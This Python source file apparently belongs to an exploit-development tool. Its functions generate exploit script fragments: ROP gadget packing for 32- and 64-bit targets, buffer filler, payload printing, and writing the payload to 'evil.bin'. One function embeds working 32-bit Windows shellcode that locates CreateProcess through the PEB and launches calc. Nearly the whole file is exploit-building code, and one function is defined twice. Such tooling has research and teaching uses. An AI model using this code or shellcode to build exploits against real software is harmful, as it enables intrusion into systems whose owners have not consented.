def hx(val, length=8):
	hex_str = format(val, 'x').zfill(length) 
	return hex_str

def genCode1_64():
	chunk="""import struct

def rq(val):
	rq = struct.pack("<Q", val)
	return rq

def binaryToStr(binary):
	new = ""
	for v in binary:
		new += "\\\\x"+"{0:02x}".format(v)
	return new
		
def genChQ(gList):
	ch=b""
	for g in gList:
		ch+=rq(g)
	return ch

"""
	return chunk

def genCode1():
	chunk="""import struct

def rg(val):
	rg=struct.pack("<I", val)
	return rg

def binaryToStr(binary):
	new = ""
	for v in binary:
		new += "\\\\x"+"{0:02x}".format(v)
	return new
		
def genCh(gList):
	ch=b""
	for g in gList:
		ch+=rg(g)
	return ch

"""
	return chunk


def genCode2(fillerQty,showAll):
	hxFillerQ=str(fillerQty)
	if showAll:
		chunk=f"""

filler = b"\\x41"
initialFiller =  {hxFillerQ}

	
"""
	if not showAll:
		chunk="""
ch=genCh(gList)
"""	
	return chunk

def genCalcShellcode():
	chunk="""
calc_shellcode = (  b"\\x31\\xdb\\x64\\x8b\\x7b\\x30\\x8b\\x7f\\x0c\\x8b\\x7f\\x1c\\x8b\\x47\\x08\\x8b"
        b"\\x77\\x20\\x8b\\x3f\\x80\\x7e\\x0c\\x33\\x75\\xf2\\x89\\xc7\\x03\\x78\\x3c\\x8b"
        b"\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\\xc7\\x89\\xdd\\x8b\\x34\\xaf\\x01\\xc6"
        b"\\x45\\x81\\x3e\\x43\\x72\\x65\\x61\\x75\\xf2\\x81\\x7e\\x08\\x6f\\x63\\x65\\x73"
        b"\\x75\\xe9\\x8b\\x7a\\x24\\x01\\xc7\\x66\\x8b\\x2c\\x6f\\x8b\\x7a\\x1c\\x01\\xc7"
        b"\\x8b\\x7c\\xaf\\xfc\\x01\\xc7\\x89\\xd9\\xb1\\xff\\x53\\xe2\\xfd\\x68\\x63\\x61"
        b"\\x6c\\x63\\x89\\xe2\\x52\\x52\\x53\\x53\\x53\\x53\\x53\\x53\\x52\\x53\\xff\\xd7")
	# Can use SHAREM to reverse engineer the Shellcode.
	# https://github.com/Bw3ll/sharem

"""
	return chunk


def genCode2_64(showAll):
	chunk="""
ch=genChQ(gListQ)

"""
	return chunk

def genCode3(showAll):
	if showAll:
		chunk="""
payload+= params

print ("Generating payload...\\n")
print (binaryToStr(payload))
print (len(payload), "bytes")
	
"""
def genCode3b(showAll):
	if showAll:
		chunk="""

print ("Generating payload...\\n")
print (binaryToStr(payload))
print (len(payload), "bytes")
	
"""
	return chunk
def genCode3(showAll):
	if showAll:
		chunk="""
payload+= params

print ("Generating payload...\\n")
print (binaryToStr(payload))
print (len(payload), "bytes")
	
"""
	if not showAll:
		chunk="""
print ("Generating payload...\\n")
print (binaryToStr(payload))
print (len(payload), "bytes")
"""		
	return chunk

def genClose():
	chunk="""
evil = open("test.bin", "wb")
evil.write(payload)
evil.close()

"""
	return chunk